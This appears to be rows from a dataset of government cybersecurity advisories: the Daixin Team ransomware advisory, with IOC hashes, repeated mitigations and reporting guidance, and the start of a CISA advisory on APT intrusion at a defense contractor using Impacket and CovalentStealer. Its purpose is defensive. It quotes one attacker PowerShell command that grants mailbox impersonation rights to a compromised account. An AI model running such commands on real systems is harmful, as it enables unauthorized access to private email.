Data Encrypted for Impact


T1486


Daixin actors have encrypted data on target systems or on large numbers of systems in a network to interrupt availability to system and network resources.




INDICATORS OF COMPROMISE
See Table 2 for IOCs obtained from third-party reporting.
Table 2: Daixin Team IOCs – Rclone Associated SHA256 Hashes




File


SHA256




rclone-v1.59.2-windows-amd64\git-log.txt


9E42E07073E03BDEA4CD978D9E7B44A9574972818593306BE1F3DCFDEE722238




rclone-v1.59.2-windows-amd64\rclone.1


19ED36F063221E161D740651E6578D50E0D3CACEE89D27A6EBED4AB4272585BD




rclone-v1.59.2-windows-amd64\rclone.exe


54E3B5A2521A84741DC15810E6FED9D739EB8083CB1FE097CB98B345AF24E939




rclone-v1.59.2-windows-amd64\README.html


EC16E2DE3A55772F5DFAC8BF8F5A365600FAD40A244A574CBAB987515AA40CBF




rclone-v1.59.2-windows-amd64\README.txt


475D6E80CF4EF70926A65DF5551F59E35B71A0E92F0FE4DD28559A9DEBA60C28





Mitigations

FBI, CISA, and HHS urge HPH Sector organizations to implement the following to protect against Daixin and related malicious activity:

Install updates for operating systems, software, and firmware as soon as they are released. Prioritize patching VPN servers, remote access software, virtual machine software, and known exploited vulnerabilities. Consider leveraging a centralized patch management system to automate and expedite the process.
Require phishing-resistant MFA for as many services as possible—particularly for webmail, VPNs, accounts that access critical systems, and privileged accounts that manage backups.
If you use Remote Desktop Protocol (RDP), secure and monitor it.

Limit access to resources over internal networks, especially by restricting RDP and using virtual desktop infrastructure. After assessing risks, if RDP is deemed operationally necessary, restrict the originating sources, and require multifactor authentication (MFA) to mitigate credential theft and reuse. If RDP must be available externally, use a virtual private network (VPN), virtual desktop infrastructure, or other means to authenticate and secure the connection before allowing RDP to connect to internal devices. Monitor remote access/RDP logs, enforce account lockouts after a specified number of attempts to block brute force campaigns, log RDP login attempts, and disable unused remote access/RDP ports.
Ensure devices are properly configured and that security features are enabled. Disable ports and protocols that are not being used for business purposes (e.g., RDP Transmission Control Protocol Port 3389).


Turn off SSH and other network device management interfaces such as Telnet, Winbox, and HTTP for wide area networks (WANs) and secure with strong passwords and encryption when enabled.
Implement and enforce multi-layer network segmentation with the most critical communications and data resting on the most secure and reliable layer.
Limit access to data by deploying public key infrastructure and digital certificates to authenticate connections with the network, Internet of Things (IoT) medical devices, and the electronic health record system, as well as to ensure data packages are not manipulated while in transit from man-in-the-middle attacks.
Use standard user accounts on internal systems instead of administrative accounts, which allow for overarching administrative system privileges and do not ensure least privilege.
Secure PII/PHI at collection points and encrypt the data at rest and in transit by using technologies such as Transport Layer Security (TPS). Only store personal patient data on internal systems that are protected by firewalls, and ensure extensive backups are available if data is ever compromised.
Protect stored data by masking the permanent account number (PAN) when it is displayed and rendering it unreadable when it is stored—through cryptography, for example.
Secure the collection, storage, and processing practices for PII and PHI, per regulations such as the Health Insurance Portability and Accountability Act of 1996 (HIPAA). Implementing HIPAA security measures can prevent the introduction of malware on the system.
Use monitoring tools to observe whether IoT devices are behaving erratically due to a compromise.
Create and regularly review internal policies that regulate the collection, storage, access, and monitoring of PII/PHI.
In addition, the FBI, CISA, and HHS urge all organizations, including HPH Sector organizations, to apply the following recommendations to prepare for, mitigate/prevent, and respond to ransomware incidents.

Preparing for Ransomware

Maintain offline (i.e., physically disconnected) backups of data, and regularly test backup and restoration. These practices safeguard an organization’s continuity of operations or at least minimize potential downtime from a ransomware incident and protect against data losses.

Ensure all backup data is encrypted, immutable (i.e., cannot be altered or deleted), and covers the entire organization’s data infrastructure.


Create, maintain, and exercise a basic cyber incident response plan and associated communications plan that includes response procedures for a ransomware incident.

Organizations should also ensure their incident response and communications plans include response and notification procedures for data breach incidents. Ensure the notification procedures adhere to applicable state laws.

Refer to applicable state data breach laws and consult legal counsel when necessary.
For breaches involving electronic health information, you may need to notify the Federal Trade Commission (FTC) or the Department of Health and Human Services, and—in some cases—the media. Refer to the FTC’s Health Breach Notification Rule and U.S. Department of Health and Human Services’ Breach Notification Rule for more information.


See CISA-Multi-State Information Sharing and Analysis Center (MS-ISAC) Joint Ransomware Guide and CISA Fact Sheet, Protecting Sensitive and Personal Information from Ransomware-Caused Data Breaches, for information on creating a ransomware response checklist and planning and responding to ransomware-caused data breaches.



Mitigating and Preventing Ransomware

Restrict Server Message Block (SMB) Protocol within the network to only access servers that are necessary and remove or disable outdated versions of SMB (i.e., SMB version 1). Threat actors use SMB to propagate malware across organizations.
Review the security posture of third-party vendors and those interconnected with your organization. Ensure all connections between third-party vendors and outside software or hardware are monitored and reviewed for suspicious activity.
Implement listing policies for applications and remote access that only allow systems to execute known and permitted programs.
Open document readers in protected viewing modes to help prevent active content from running.
Implement user training program and phishing exercises to raise awareness among users about the risks of visiting suspicious websites, clicking on suspicious links, and opening suspicious attachments. Reinforce the appropriate user response to phishing and spearphishing emails.
Use strong passwords and avoid reusing passwords for multiple accounts. See CISA Tip Choosing and Protecting Passwords and the National Institute of Standards and Technology’s (NIST’s) Special Publication 800-63B: Digital Identity Guidelines for more information.
Require administrator credentials to install software.
Audit user accounts with administrative or elevated privileges and configure access controls with least privilege in mind.
Install and regularly update antivirus and antimalware software on all hosts.
Only use secure networks and avoid using public Wi-Fi networks. Consider installing and using a VPN.
Consider adding an email banner to messages coming from outside your organizations.
Disable hyperlinks in received emails.

Responding to Ransomware Incidents
If a ransomware incident occurs at your organization:

Follow your organization’s Ransomware Response Checklist (see Preparing for Ransomware section).
Scan backups. If possible, scan backup data with an antivirus program to check that it is free of malware. This should be performed using an isolated, trusted system to avoid exposing backups to potential compromise.
Follow the notification requirements as outlined in your cyber incident response plan.
Report incidents to the FBI at a local FBI Field Office, CISA at cisa.gov/report, or the U.S. Secret Service (USSS) at a USSS Field Office.
Apply incident response best practices found in the joint Cybersecurity Advisory, Technical Approaches to Uncovering and Remediating Malicious Activity, developed by CISA and the cybersecurity authorities of Australia, Canada, New Zealand, and the United Kingdom.

Note: FBI, CISA, and HHS strongly discourage paying ransoms as doing so does not guarantee files and records will be recovered. Furthermore, payment may also embolden adversaries to target additional organizations, encourage other criminal actors to engage in the distribution of ransomware, and/or fund illicit activities.
REFERENCES

Stopransomware.gov is a whole-of-government approach that gives one central location for ransomware resources and alerts.
Resource to mitigate a ransomware attack: CISA-Multi-State Information Sharing and Analysis Center (MS-ISAC) Joint Ransomware Guide.
No-cost cyber hygiene services: Cyber Hygiene Services and Ransomware Readiness Assessment.
Ongoing Threat Alerts and Sector alerts are produced by the Health Sector Cybersecurity Coordination Center (HC3) and can be found at hhs.gov/HC3.
For additional best practices for Healthcare cybersecurity issues see the HHS 405(d) Aligning Health Care Industry Security Approaches at 405d.hhs.gov 

REPORTING
The FBI is seeking any information that can be shared, to include boundary logs showing communication to and from foreign IP addresses, a sample ransom note, communications with Daixin Group actors, Bitcoin wallet information, decryptor files, and/or a benign sample of an encrypted file. Regardless of whether you or your organization have decided to pay the ransom, the FBI, CISA, and HHS urge you to promptly report ransomware incidents to a local FBI Field Office, or CISA at cisa.gov/report.
ACKNOWLEDGEMENTS
FBI, CISA, and HHS would like to thank CrowdStrike and the Health Information Sharing and Analysis Center (Health-ISAC) for their contributions to this CSA.
DISCLAIMER
The information in this report is being provided “as is” for informational purposes only. FBI, CISA, and HHS do not endorse any commercial product or service, including any subjects of analysis. Any reference to specific commercial products, processes, or services by service mark, trademark, manufacturer, or otherwise, does not constitute or imply endorsement, recommendation, or favoring by FBI, CISA, or HHS.

Revisions

Initial Publication: October 21, 2022






This product is provided subject to this Notification and this Privacy & Use policy.


","{'T1567', 'T1190', 'T1563.002', 'T1003', 'T1598.002', 'T1486', 'T1098', 'T1550.002', 'TA0010', 'T1563.001', 'T1078'}","




Summary

Actions to take today to mitigate cyber threats from ransomware:

Install updates for operating systems, software, and firmware as soon as they are released.
Require phishing-resistant MFA for as many services as possible.
Train users to recognize and report phishing attempts.

Note: This joint Cybersecurity Advisory (CSA) is part of an ongoing #StopRansomware effort to publish advisories for network defenders that detail various ransomware variants and ransomware threat actors. These #StopRansomware advisories include recently and historically observed tactics, techniques, and procedures (TTPs) and indicators of compromise (IOCs) to help organizations protect against ransomware. Visit stopransomware.gov to see all #StopRansomware advisories and to learn more about other ransomware threats and no-cost resources.
The Federal Bureau of Investigation (FBI), Cybersecurity and Infrastructure Security Agency (CISA), and Department of Health and Human Services (HHS) are releasing this joint CSA to provide information on the “Daixin Team,” a cybercrime group that is actively targeting U.S. businesses, predominantly in the Healthcare and Public Health (HPH) Sector, with ransomware and data extortion operations.
This joint CSA provides TTPs and IOCs of Daixin actors obtained from FBI threat response activities and third-party reporting.
Download the PDF version of this report:


Stopransomware Daixin Team
(PDF,       560.58 KB
  )


Download the IOCs: 


AA22-294A STIX
(XML,       23.22 KB
  )


Technical Details
Note: This advisory uses the MITRE ATT&CK® for Enterprise framework, version 11. See MITRE ATT&CK for Enterprise for all referenced tactics and techniques.
Cybercrime actors routinely target HPH Sector organizations with ransomware:

As of October 2022, per FBI Internet Crime Complaint Center (IC3) data, specifically victim reports across all 16 critical infrastructure sectors, the HPH Sector accounts for 25 percent of ransomware complaints.
According to an IC3 annual report in 2021, 649 ransomware reports were made across 14 critical infrastructure sectors; the HPH Sector accounted for the most reports at 148.

The Daixin Team is a ransomware and data extortion group that has targeted the HPH Sector with ransomware and data extortion operations since at least June 2022. Since then, Daixin Team cybercrime actors have caused ransomware incidents at multiple HPH Sector organizations where they have:

Deployed ransomware to encrypt servers responsible for healthcare services—including electronic health records services, diagnostics services, imaging services, and intranet services, and/or
Exfiltrated personal identifiable information (PII) and patient health information (PHI) and threatened to release the information if a ransom is not paid.

Daixin actors gain initial access to victims through virtual private network (VPN) servers. In one confirmed compromise, the actors likely exploited an unpatched vulnerability in the organization’s VPN server,. In another confirmed compromise, the actors used previously compromised credentials to access a legacy VPN server, that did not have multifactor authentication (MFA) enabled. The actors are believed to have acquired the VPN credentials through the use of a phishing email with a malicious attachment,.
After obtaining access to the victim’s VPN server, Daixin actors move laterally via Secure Shell (SSH), and Remote Desktop Protocol (RDP),. Daixin actors have sought to gain privileged account access through credential dumping, and pass the hash,. The actors have leveraged privileged accounts to gain access to VMware vCenter Server and reset account passwords, for ESXi servers in the environment. The actors have then used SSH to connect to accessible ESXi servers and deploy ransomware, on those servers. 
According to third-party reporting, the Daixin Team’s ransomware is based on leaked Babuk Locker source code. This third-party reporting as well as FBI analysis show that the ransomware targets ESXi servers and encrypts files located in /vmfs/volumes/ with the following extensions: .vmdk.vmem.vswp.vmsd.vmx, and .vmsn. A ransom note is also written to /vmfs/volumes/. See Figure 1 for targeted file system path and Figure 2 for targeted file extensions list. Figure 3 and Figure 4 include examples of ransom notes. Note that in the Figure 3 ransom note, Daixin actors misspell “Daixin” as “Daxin.”

Figure 1: Daixin Team – Ransomware Targeted File Path

Figure 2: Daixin Team – Ransomware Targeted File Extensions

Figure 3: Example 1 of Daixin Team Ransomware Note

Figure 4: Example 2 of Daixin Team Ransomware Note
In addition to deploying ransomware, Daixin actors have exfiltrated data, from victim systems. In one confirmed compromise, the actors used Rclone—an open-source program to manage files on cloud storage—to exfiltrate data to a dedicated virtual private server (VPS). In another compromise, the actors used Ngrok—a reverse proxy tool for proxying an internal service out onto an Ngrok domain—for data exfiltration,.
MITRE ATT&CK TACTICS AND TECHNIQUES
See Table 1 for all referenced threat actor tactics and techniques included in this advisory.
Table 1: Daixin Actors’ ATT&CK Techniques for Enterprise

INDICATORS OF COMPROMISE
See Table 2 for IOCs obtained from third-party reporting.
Table 2: Daixin Team IOCs – Rclone Associated SHA256 Hashes


Mitigations

FBI, CISA, and HHS urge HPH Sector organizations to implement the following to protect against Daixin and related malicious activity:

Install updates for operating systems, software, and firmware as soon as they are released. Prioritize patching VPN servers, remote access software, virtual machine software, and known exploited vulnerabilities. Consider leveraging a centralized patch management system to automate and expedite the process.
Require phishing-resistant MFA for as many services as possible—particularly for webmail, VPNs, accounts that access critical systems, and privileged accounts that manage backups.
If you use Remote Desktop Protocol (RDP), secure and monitor it.

Limit access to resources over internal networks, especially by restricting RDP and using virtual desktop infrastructure. After assessing risks, if RDP is deemed operationally necessary, restrict the originating sources, and require multifactor authentication (MFA) to mitigate credential theft and reuse. If RDP must be available externally, use a virtual private network (VPN), virtual desktop infrastructure, or other means to authenticate and secure the connection before allowing RDP to connect to internal devices. Monitor remote access/RDP logs, enforce account lockouts after a specified number of attempts to block brute force campaigns, log RDP login attempts, and disable unused remote access/RDP ports.
Ensure devices are properly configured and that security features are enabled. Disable ports and protocols that are not being used for business purposes (e.g., RDP Transmission Control Protocol Port 3389).


Turn off SSH and other network device management interfaces such as Telnet, Winbox, and HTTP for wide area networks (WANs) and secure with strong passwords and encryption when enabled.
Implement and enforce multi-layer network segmentation with the most critical communications and data resting on the most secure and reliable layer.
Limit access to data by deploying public key infrastructure and digital certificates to authenticate connections with the network, Internet of Things (IoT) medical devices, and the electronic health record system, as well as to ensure data packages are not manipulated while in transit from man-in-the-middle attacks.
Use standard user accounts on internal systems instead of administrative accounts, which allow for overarching administrative system privileges and do not ensure least privilege.
Secure PII/PHI at collection points and encrypt the data at rest and in transit by using technologies such as Transport Layer Security (TPS). Only store personal patient data on internal systems that are protected by firewalls, and ensure extensive backups are available if data is ever compromised.
Protect stored data by masking the permanent account number (PAN) when it is displayed and rendering it unreadable when it is stored—through cryptography, for example.
Secure the collection, storage, and processing practices for PII and PHI, per regulations such as the Health Insurance Portability and Accountability Act of 1996 (HIPAA). Implementing HIPAA security measures can prevent the introduction of malware on the system.
Use monitoring tools to observe whether IoT devices are behaving erratically due to a compromise.
Create and regularly review internal policies that regulate the collection, storage, access, and monitoring of PII/PHI.
In addition, the FBI, CISA, and HHS urge all organizations, including HPH Sector organizations, to apply the following recommendations to prepare for, mitigate/prevent, and respond to ransomware incidents.

Preparing for Ransomware

Maintain offline (i.e., physically disconnected) backups of data, and regularly test backup and restoration. These practices safeguard an organization’s continuity of operations or at least minimize potential downtime from a ransomware incident and protect against data losses.

Ensure all backup data is encrypted, immutable (i.e., cannot be altered or deleted), and covers the entire organization’s data infrastructure.


Create, maintain, and exercise a basic cyber incident response plan and associated communications plan that includes response procedures for a ransomware incident.

Organizations should also ensure their incident response and communications plans include response and notification procedures for data breach incidents. Ensure the notification procedures adhere to applicable state laws.

Refer to applicable state data breach laws and consult legal counsel when necessary.
For breaches involving electronic health information, you may need to notify the Federal Trade Commission (FTC) or the Department of Health and Human Services, and—in some cases—the media. Refer to the FTC’s Health Breach Notification Rule and U.S. Department of Health and Human Services’ Breach Notification Rule for more information.


See CISA-Multi-State Information Sharing and Analysis Center (MS-ISAC) Joint Ransomware Guide and CISA Fact Sheet, Protecting Sensitive and Personal Information from Ransomware-Caused Data Breaches, for information on creating a ransomware response checklist and planning and responding to ransomware-caused data breaches.



Mitigating and Preventing Ransomware

Restrict Server Message Block (SMB) Protocol within the network to only access servers that are necessary and remove or disable outdated versions of SMB (i.e., SMB version 1). Threat actors use SMB to propagate malware across organizations.
Review the security posture of third-party vendors and those interconnected with your organization. Ensure all connections between third-party vendors and outside software or hardware are monitored and reviewed for suspicious activity.
Implement listing policies for applications and remote access that only allow systems to execute known and permitted programs.
Open document readers in protected viewing modes to help prevent active content from running.
Implement user training program and phishing exercises to raise awareness among users about the risks of visiting suspicious websites, clicking on suspicious links, and opening suspicious attachments. Reinforce the appropriate user response to phishing and spearphishing emails.
Use strong passwords and avoid reusing passwords for multiple accounts. See CISA Tip Choosing and Protecting Passwords and the National Institute of Standards and Technology’s (NIST’s) Special Publication 800-63B: Digital Identity Guidelines for more information.
Require administrator credentials to install software.
Audit user accounts with administrative or elevated privileges and configure access controls with least privilege in mind.
Install and regularly update antivirus and antimalware software on all hosts.
Only use secure networks and avoid using public Wi-Fi networks. Consider installing and using a VPN.
Consider adding an email banner to messages coming from outside your organizations.
Disable hyperlinks in received emails.

Responding to Ransomware Incidents
If a ransomware incident occurs at your organization:

Follow your organization’s Ransomware Response Checklist (see Preparing for Ransomware section).
Scan backups. If possible, scan backup data with an antivirus program to check that it is free of malware. This should be performed using an isolated, trusted system to avoid exposing backups to potential compromise.
Follow the notification requirements as outlined in your cyber incident response plan.
Report incidents to the FBI at a local FBI Field Office, CISA at cisa.gov/report, or the U.S. Secret Service (USSS) at a USSS Field Office.
Apply incident response best practices found in the joint Cybersecurity Advisory, Technical Approaches to Uncovering and Remediating Malicious Activity, developed by CISA and the cybersecurity authorities of Australia, Canada, New Zealand, and the United Kingdom.

Note: FBI, CISA, and HHS strongly discourage paying ransoms as doing so does not guarantee files and records will be recovered. Furthermore, payment may also embolden adversaries to target additional organizations, encourage other criminal actors to engage in the distribution of ransomware, and/or fund illicit activities.
REFERENCES

Stopransomware.gov is a whole-of-government approach that gives one central location for ransomware resources and alerts.
Resource to mitigate a ransomware attack: CISA-Multi-State Information Sharing and Analysis Center (MS-ISAC) Joint Ransomware Guide.
No-cost cyber hygiene services: Cyber Hygiene Services and Ransomware Readiness Assessment.
Ongoing Threat Alerts and Sector alerts are produced by the Health Sector Cybersecurity Coordination Center (HC3) and can be found at hhs.gov/HC3.
For additional best practices for Healthcare cybersecurity issues see the HHS 405(d) Aligning Health Care Industry Security Approaches at 405d.hhs.gov 

REPORTING
The FBI is seeking any information that can be shared, to include boundary logs showing communication to and from foreign IP addresses, a sample ransom note, communications with Daixin Group actors, Bitcoin wallet information, decryptor files, and/or a benign sample of an encrypted file. Regardless of whether you or your organization have decided to pay the ransom, the FBI, CISA, and HHS urge you to promptly report ransomware incidents to a local FBI Field Office, or CISA at cisa.gov/report.
ACKNOWLEDGEMENTS
FBI, CISA, and HHS would like to thank CrowdStrike and the Health Information Sharing and Analysis Center (Health-ISAC) for their contributions to this CSA.
DISCLAIMER
The information in this report is being provided “as is” for informational purposes only. FBI, CISA, and HHS do not endorse any commercial product or service, including any subjects of analysis. Any reference to specific commercial products, processes, or services by service mark, trademark, manufacturer, or otherwise, does not constitute or imply endorsement, recommendation, or favoring by FBI, CISA, or HHS.

Revisions

Initial Publication: October 21, 2022






This product is provided subject to this Notification and this Privacy & Use policy.


",https://www.cisa.gov/news-events/cybersecurity-advisories/aa22-294a
39,"




Summary

Actions to Help Protect Against APT Cyber Activity:• Enforce multifactor authentication (MFA) on all user accounts.• Implement network segmentation to separate network segments based on role and functionality.• Update software, including operating systems, applications, and firmware, on network assets.• Audit account usage.
From November 2021 through January 2022, the Cybersecurity and Infrastructure Security Agency (CISA) responded to advanced persistent threat (APT) activity on a Defense Industrial Base (DIB) Sector organization’s enterprise network. During incident response activities, CISA uncovered that likely multiple APT groups compromised the organization’s network, and some APT actors had long-term access to the environment. APT actors used an open-source toolkit called Impacket to gain their foothold within the environment and further compromise the network, and also used a custom data exfiltration tool, CovalentStealer, to steal the victim’s sensitive data.
This joint Cybersecurity Advisory (CSA) provides APT actors tactics, techniques, and procedures (TTPs) and indicators of compromise (IOCs) identified during the incident response activities by CISA and a third-party incident response organization. The CSA includes detection and mitigation actions to help organizations detect and prevent related APT activity. CISA, the Federal Bureau of Investigation (FBI), and the National Security Agency (NSA) recommend DIB sector and other critical infrastructure organizations implement the mitigations in this CSA to ensure they are managing and reducing the impact of cyber threats to their networks.
Download the PDF version of this report: pdf, 692 KB
For a downloadable copy of IOCs, see the following files:

Malware Analysis Report (MAR)-10365227-1.stix, 966 kb
MAR-10365227-2.stix, 249B
MAR-10365227-3.stix, 3.2 MB


Technical Details

Threat Actor Activity
Note: This advisory uses the MITRE ATT&CK® for Enterprise framework, version 11. See the MITRE ATT&CK Tactics and Techniques section for a table of the APT cyber activity mapped to MITRE ATT&CK for Enterprise framework.
From November 2021 through January 2022, CISA conducted an incident response engagement on a DIB Sector organization’s enterprise network. The victim organization also engaged a third-party incident response organization for assistance. During incident response activities, CISA and the trusted –third-party identified APT activity on the victim’s network.
Some APT actors gained initial access to the organization’s Microsoft Exchange Server as early as mid-January 2021. The initial access vector is unknown. Based on log analysis, the actors gathered information about the exchange environment and performed mailbox searches within a four-hour period after gaining access. In the same period, these actors used a compromised administrator account (“Admin 1”) to access the EWS Application Programming Interface (API). In early February 2021, the actors returned to the network and used Admin 1 to access EWS API again. In both instances, the actors used a virtual private network (VPN).
Four days later, the APT actors used Windows Command Shell over a three-day period to interact with the victim’s network. The actors used Command Shell to learn about the organization’s environment and to collect sensitive data, including sensitive contract-related information from shared drives, for eventual exfiltration. The actors manually collected files using the command-line tool, WinRAR. These files were split into approximately 3MB chunks located on the Microsoft Exchange server within the CU2\he\debug directory. See Appendix: Windows Command Shell Activity for additional information, including specific commands used.
During the same period, APT actors implanted Impacket, a Python toolkit for programmatically constructing and manipulating network protocols, on another system. The actors used Impacket to attempt to move laterally to another system.
In early March 2021, APT actors exploited CVE-2021-26855, CVE-2021-26857, CVE-2021-26858, and CVE-2021-27065 to install 17 China Chopper webshells on the Exchange Server. Later in March, APT actors installed HyperBro on the Exchange Server and two other systems. For more information on the HyperBro and webshell samples, see CISA MAR-10365227-2 and -3.
In April 2021, APT actors used Impacket for network exploitation activities. See the Use of Impacket section for additional information. From late July through mid-October 2021, APT actors employed a custom exfiltration tool, CovalentStealer, to exfiltrate the remaining sensitive files. See the Use of Custom Exfiltration Tool: CovalentStealer section for additional information.
APT actors maintained access through mid-January 2022, likely by relying on legitimate credentials.
Use of Impacket
CISA discovered activity indicating the use of two Impacket tools: wmiexec.py and smbexec.py. These tools use Windows Management Instrumentation (WMI) and Server Message Block (SMB) protocol, respectively, for creating a semi-interactive shell with the target device. Through the Command Shell, an Impacket user with credentials can run commands on the remote device using the Windows management protocols required to support an enterprise network.
The APT cyber actors used existing, compromised credentials with Impacket to access a higher privileged service account used by the organization's multifunctional devices. The threat actors first used the service account to remotely access the organization’s Microsoft Exchange server via Outlook Web Access (OWA) from multiple external IP addresses; shortly afterwards, the actors assigned the Application Impersonation role to the service account by running the following PowerShell command for managing Exchange:
powershell add-pssnapin *exchange*;New-ManagementRoleAssignment - name:""Journaling-Logs"" -Role:ApplicationImpersonation -User:<account>
This command gave the service account the ability to access other users’ mailboxes.
The APT cyber actors used virtual private network (VPN) and virtual private server (VPS) providers, M247 and SurfShark, as part of their techniques to remotely access the Microsoft Exchange server. Use of these hosting providers, which serves to conceal interaction with victim networks, are common for these threat actors. According to CISA’s analysis of the victim’s Microsoft Exchange server Internet Information Services (IIS) logs, the actors used the account of a former employee to access the EWS. EWS enables access to mailbox items such as email messages, meetings, and contacts. The source IP address for these connections is mostly from the VPS hosting provider, M247.
Use of Custom Exfiltration Tool: CovalentStealer
The threat actors employed a custom exfiltration tool, CovalentStealer, to exfiltrate sensitive files.
CovalentStealer is designed to identify file shares on a system, categorize the files, and upload the files to a remote server. CovalentStealer includes two configurations that specifically target the victim's documents using predetermined files paths and user credentials. CovalentStealer stores the collected files on a Microsoft OneDrive cloud folder, includes a configuration file to specify the types of files to collect at specified times and uses a 256-bit AES key for encryption. See CISA MAR-10365227-1 for additional technical details, including IOCs and detection signatures.
MITRE ATT&CK Tactics and Techniques
MITRE ATT&CK is a globally accessible knowledge base of adversary tactics and techniques based on real-world observations. CISA uses the ATT&CK Framework as a foundation for the development of specific threat models and methodologies. Table 1 lists the ATT&CK techniques employed by the APT actors.

Table 1: Identified APT Enterprise ATT&CK Tactics and Techniques


Initial Access


Technique Title
ID
Use


Valid Accounts
T1078
Actors obtained and abused credentials of existing accounts as a means of gaining Initial Access, Persistence, Privilege Escalation, or Defense Evasion. In this case, they exploited an organization’s multifunctional device domain account used to access the organization’s Microsoft Exchange server via OWA.


Execution


Technique Title
ID
Use


Windows Management Instrumentation
T1047
Actors used Impacket tools wmiexec.py and smbexec.py to leverage Windows Management Instrumentation and execute malicious commands.


Command and Scripting Interpreter
T1059
Actors abused command and script interpreters to execute commands.


Command and Scripting Interpreter: PowerShell
T1059.001
Actors abused PowerShell commands and scripts to map shared drives by specifying a path to one location and retrieving the items from another. See Appendix: Windows Command Shell Activity for additional information.


Command and Scripting Interpreter: Windows Command Shell
T1059.003

Actors abused the Windows Command Shell to learn about the organization’s environment and to collect sensitive data. See Appendix: Windows Command Shell Activity for additional information, including specific commands used.
The actors used Impacket tools, which enable a user with credentials to run commands on the remote device through the Command Shell.



Command and Scripting Interpreter: Python
T1059.006
The actors used two Impacket tools: wmiexec.py and smbexec.py.


Shared Modules
T1129
Actors executed malicious payloads via loading shared modules. The Windows module loader can be instructed to load DLLs from arbitrary local paths and arbitrary Universal Naming Convention (UNC) network paths.


System Services
T1569
Actors abused system services to execute commands or programs on the victim’s network.


Persistence


Technique Title
ID
Use


Valid Accounts
T1078
Actors obtained and abused credentials of existing accounts as a means of gaining Initial Access, Persistence, Privilege Escalation, or Defense Evasion.


Create or Modify System Process
T1543
Actors were observed creating or modifying system processes.


Privilege Escalation


Technique Title
ID
Use


Valid Accounts
T1078
Actors obtained and abused credentials of existing accounts as a means of gaining Initial Access, Persistence, Privilege Escalation, or Defense Evasion. In this case, they exploited an organization’s multifunctional device domain account used to access the organization’s Microsoft Exchange server via OWA.


Defense Evasion


Technique Title
ID
Use


Masquerading: Match Legitimate Name or Location
T1036.005
Actors masqueraded the archive utility WinRAR.exe by renaming it VMware.exe to evade defenses and observation.


Indicator Removal on Host
T1070
Actors deleted or modified artifacts generated on a host system to remove evidence of their presence or hinder defenses.


Indicator Removal on Host: File Deletion
T1070.004
Actors used the del.exe command with the /f parameter to force the deletion of read-only files with the *.rar and tempg* wildcards.


Valid Accounts
T1078
Actors obtained and abused credentials of existing accounts as a means of gaining Initial Access, Persistence, Privilege Escalation, or Defense Evasion. In this case, they exploited an organization’s multifunctional device domain account used to access the organization’s Microsoft Exchange server via OWA.


Virtualization/Sandbox Evasion: System Checks
T1497.001
Actors used Windows command shell commands to detect and avoid virtualization and analysis environments. See Appendix: Windows Command Shell Activity for additional information.


Impair Defenses: Disable or Modify Tools
T1562.001
Actors used the taskkill command to probably disable security features. CISA was unable to determine which application was associated with the Process ID.


Hijack Execution Flow
T1574
Actors were observed using hijack execution flow.


Discovery


Technique Title
ID
Use


System Network Configuration Discovery
T1016

Actors used the systeminfo command to look for details about the network configurations and settings and determine if the system was a VMware virtual machine.
The threat actor used route print to display the entries in the local IP routing table.



System Network Configuration Discovery: Internet Connection Discovery
T1016.001
Actors checked for internet connectivity on compromised systems. This may be performed during automated discovery and can be accomplished in numerous ways.


System Owner/User Discovery
T1033
Actors attempted to identify the primary user, currently logged in user, set of users that commonly use a system, or whether a user is actively using the system.


System Network Connections Discovery
T1049
Actors used the netstat command to display TCP connections, prevent hostname determination of foreign IP addresses, and specify the protocol for TCP.


Process Discovery
T1057

Actors used the tasklist command to get information about running processes on a system and determine if the system was a VMware virtual machine.
The actors used tasklist.exe and find.exe to display a list of applications and services with their PIDs for all tasks running on the computer matching the string “powers.”



System Information Discovery
T1082
Actors used the ipconfig command to get detailed information about the operating system and hardware and determine if the system was a VMware virtual machine.


File and Directory Discovery
T1083
Actors enumerated files and directories or may search in specific locations of a host or network share for certain information within a file system.


Virtualization/Sandbox Evasion: System Checks
T1497.001
Actors used Windows command shell commands to detect and avoid virtualization and analysis environments.


Lateral Movement


Technique Title
ID
Use


Remote Services: SMB/Windows Admin Shares
T1021.002
Actors used Valid Accounts to interact with a remote network share using Server Message Block (SMB) and then perform actions as the logged-on user.


Collection


Technique Title
ID
Use


Archive Collected Data: Archive via Utility
T1560.001
Actor used PowerShell commands and WinRAR to compress and/or encrypt collected data prior to exfiltration.


Data from Network Shared Drive
T1039

Actors likely used net share command to display information about shared resources on the local computer and decide which directories to exploit, the powershell dir command to map shared drives to a specified path and retrieve items from another, and the ntfsinfo command to search network shares on computers they have compromised to find files of interest.
The actors used dir.exe to display a list of a directory's files and subdirectories matching a certain text string.



Data Staged: Remote Data Staging
T1074.002
The actors split collected files into approximately3 MB chunks located on the Exchange server within the CU2\he\debug directory.


Command and Control


Technique Title
ID
Use


Non-Application Layer Protocol
T1095
Actors used a non-application layer protocol for communication between host and Command and Control (C2) server or among infected hosts within a network.


Ingress Tool Transfer
T1105

Actors used the certutil command with three switches to test if they could download files from the internet.
The actors employed CovalentStealer to exfiltrate the files.



Proxy
T1090
Actors are known to use VPN and VPS providers, namely M247 and SurfShark, as part of their techniques to access a network remotely.


Exfiltration


Technique Title
ID
Use


Schedule Transfer
T1029
Actors scheduled data exfiltration to be performed only at certain times of day or at certain intervals and blend traffic patterns with normal activity.


Exfiltration Over Web Service: Exfiltration to Cloud Storage
T1567.002
The actor's CovalentStealer tool stores collected files on a Microsoft OneDrive cloud folder.



DETECTION
Given the actors’ demonstrated capability to maintain persistent, long-term access in compromised enterprise environments, CISA, FBI, and NSA encourage organizations to:

Monitor logs for connections from unusual VPSs and VPNs. Examine connection logs for access from unexpected ranges, particularly from machines hosted by SurfShark and M247.
Monitor for suspicious account use (e.g., inappropriate or unauthorized use of administrator accounts, service accounts, or third-party accounts). To detect use of compromised credentials in combination with a VPS, follow the steps below:

Review logs for ""impossible logins,"" such as logins with changing username, user agent strings, and IP address combinations or logins where IP addresses do not align to the expected user’s geographic location.
Search for ""impossible travel,"" which occurs when a user logs in from multiple IP addresses that are a significant geographic distance apart (i.e., a person could not realistically travel between the geographic locations of the two IP addresses in the time between logins). Note: This detection opportunity can result in false positives if legitimate users apply VPN solutions before connecting to networks.
Search for one IP used across multiple accounts, excluding expected logins.

Take note of any M247-associated IP addresses used along with VPN providers (e.g., SurfShark). Look for successful remote logins (e.g., VPN, OWA) for IPs coming from M247- or using SurfShark-registered IP addresses.


Identify suspicious privileged account use after resetting passwords or applying user account mitigations.
Search for unusual activity in typically dormant accounts.
Search for unusual user agent strings, such as strings not typically associated with normal user activity, which may indicate bot activity.


Review the YARA rules provided in MAR-10365227-1 to assist in determining whether malicious activity has been observed.
